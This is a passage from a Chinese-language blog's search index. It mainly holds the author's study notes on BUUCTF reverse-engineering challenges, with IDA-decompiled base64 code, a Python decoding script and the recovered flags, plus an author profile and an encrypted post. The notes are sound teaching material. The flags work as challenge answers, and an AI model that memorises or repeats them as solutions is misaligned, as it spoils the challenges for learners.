            <tag> 游戏开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse学习笔记</title>
      <link href="/2025/01/13/re%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/01/13/re%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><p><img src="/pic/reverse1/1.png" alt="1"></p><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1:"></a>reverse1:</h3><p>下载附件，解压，将程序用ida打开</p><p><img src="/pic/reverse1/2.png" alt="1"></p><p>找到主函数，分析得出字符str2为正确的flag</p><p><img src="/pic/reverse1/3.png" alt="1"></p><p>进入得到str2的值，即flag</p><p>然而这是初始的str2值，在主函数中，for循环对str2进行了处理，str2里面ascii码为111的字符会被转换为ascii码为48的字符</p><p><img src="/pic/reverse1/4.png" alt="1"></p><p>因此需要进行再次转换，得到flag,    flag{hell0_w0rld}</p><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p>题目为exe文件</p><p>首先，放入exeinfo查壳</p><p><img src="https://pic1.imgdb.cn/item/678a1273d0e0a243d4f53069.png" alt=""></p><p>发现为32位程序，无壳</p><p>用IDA打开：</p><p>分析主函数：</p><p><img src="https://pic1.imgdb.cn/item/678a12f5d0e0a243d4f53173.png" alt=""></p><p>其中，sub_4110BE函数实现了base64编码</p><p>sub_4110BE:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_411AB0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v9 = a2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span> )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 = <span class="number">4</span> * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  v12 = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  j_memset(v12, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v5 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v5) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v6 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v4 = v6 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)v12 + v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">        *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v4 = v7 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)v12 + v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>aAbcdefghijklmn</code>是一个全局数组，用于存放Base64编码所对应的字符</p><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</code></p><p>可以确定确实为base64编码。</p><p>由于最后使用strncmp函数比较Destination和Str2，我们进入Str2查找其值：<code>e3nifIH9b_C@n@dH</code></p><p>得到Str2后，可以根据main函数的原理逆解出flag</p><p>总结主函数的基本内容：</p><p><code>输入flag——base64加密——赋值给v4——复制给Destination——for循环——与Str2比较</code></p><p>那么逆向解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])-i)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/678a188cd0e0a243d4f5349c.png" alt=""></p><p>得到flag</p><p>flag{i_l0ve_you}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于M.Y</title>
      <link href="/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/"/>
      <url>/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="个人简介"><a href="#个人简介" class="headerlink" title="个人简介"></a>个人简介</h2><p>Hello，大家好！我M.Y (CZXH &amp; Cer)，一名来自UKFC-UKY的初级CTFer,这是我创建的第一篇博客。我将在我的博客上记录，分享我学习CTF及其他相关内容的所思所感。同时，我希望这里能成为我们交流思想，分享知识的桥梁。</p><hr><p>我是一位对CTF，编程，绘画，设计，游戏制作，图像处理，剪辑，摄影，写作等充满热情的大学生。我将在博客上持续记录和分享我学习的收获，希望通过努力，我能成为梦想中的一名CTF全栈手和网络安全领域的大神，同时能对大家在学习网络安全的道路上提供帮助，我相信分享和交流是我们不断进步的源泉。</p><p>我是创立C联（CZXH Association &amp; CZXH &amp; Clian &amp; 愚人的幻想交友会）的当代盟主，秉持对幻想创作的热爱和对无暇友谊的追求，为所有的成员打开新世界的大门，以不同的形式，实现属于我们心中的美好幻想，创造独属于自己的浪漫希望。</p><p>冰冰邦邦~~~~🎉🎉🎉</p><pre><code>写在后面：       在这个世界上，没有一蹴而就的成功，也没有一劳永逸的成就。每一个辉煌的时刻，都是无数个日夜努力的积累；每一个耀眼的成果，都是无数次挫折后的坚持（佚名）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是一个flag!</title>
      <link href="/2016/03/30/flag/"/>
      <url>/2016/03/30/flag/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="b5e2741ca5d7a107881c7eef812073083d6fbd5bd19761d0d3f331a7bf682e43">072c2e61e0fc96379b99a2ae58de6f039b92399abfd8b778c6c0a47eada94e88e11ff5ad88d3a2f399c098cc03623eaba8c137c19a2adb954940255b114688c9b9446262128647d445c9a67329fe16ab921537ac15b44cb3555a2a7bec296ce4a52c857fd974117e27678d9bbd0d24b0686f003d0b4cac04003de52ff81514a3e558140fec2c571eb553c5d85106cd5527bc1153dec71c8517d5035157c1a46079c51f23600b8d3fe0644fc4a431f85a0d0206740f4bdd5e38bcf791e006603e89dcb3e1f0f1b3e7d6f76e5567d3f03f34009222b574d071fdd494f23ec468b92b779458a268f92ce82410800f17037d7467337d9bf2311ea1f25a26d5270e31313f8db1d04a6abb7f8ae5e951ff9a12a3901321b70db4482ca9f42ddab347f1198db17af2e82da3e57b3f20b5e7cd1ed486eaa7795b7f9b17d12255f8ca4f4d589253c04b276f36032ab326966e5ce7e71af96bfa833976aa3203de51a8e026</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记（加密） </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
